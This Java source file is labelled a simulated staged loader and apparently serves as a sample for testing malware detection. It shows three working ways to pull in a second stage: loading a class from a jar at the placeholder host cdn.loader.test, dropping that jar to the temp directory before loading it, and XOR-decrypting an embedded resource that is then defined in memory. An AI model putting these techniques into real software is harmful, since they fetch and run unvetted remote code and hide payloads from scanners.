package dev.javabyte.guest.sim;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.invoke.MethodHandles;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * Simulated staged loader. The second stage ({@link Payload}) is not in this sample's jar; it
 * arrives over the network, from a dropped file, or as an encrypted resource defined in memory,
 * depending on the first argument.
 */
public final class Loaders {

    public static void main(String[] args) throws Exception {
        String mode = args[0];
        Class<?> stage;
        switch (mode) {
            case "url-http":
                stage = new URLClassLoader(new URL[] {new URL("http://cdn.loader.test/stage.jar")})
                        .loadClass("dev.javabyte.guest.sim.Payload");
                break;
            case "url-file": {
                File dropped = new File(System.getProperty("java.io.tmpdir"), "stage.jar");
                try (InputStream in = new URL("http://cdn.loader.test/stage.jar").openStream();
                        FileOutputStream out = new FileOutputStream(dropped)) {
                    out.write(in.readAllBytes());
                }
                stage = URLClassLoader.newInstance(new URL[] {dropped.toURI().toURL()})
                        .loadClass("dev.javabyte.guest.sim.Payload");
                break;
            }
            case "lookup": {
                byte[] bytes;
                try (InputStream in = Loaders.class.getResourceAsStream("/payload.enc")) {
                    bytes = in.readAllBytes();
                }
                for (int i = 0; i < bytes.length; i++) {
                    bytes[i] ^= 0x41;
                }
                // Lookup.defineClass needs no class loader subclass at all.
                stage = MethodHandles.lookup().defineClass(bytes);
                break;
            }
            default:
                throw new IllegalArgumentException(mode);
        }
        Object instance = stage.getDeclaredConstructor().newInstance();
        System.out.println(stage.getMethod("run", String.class).invoke(instance, mode));
    }
}
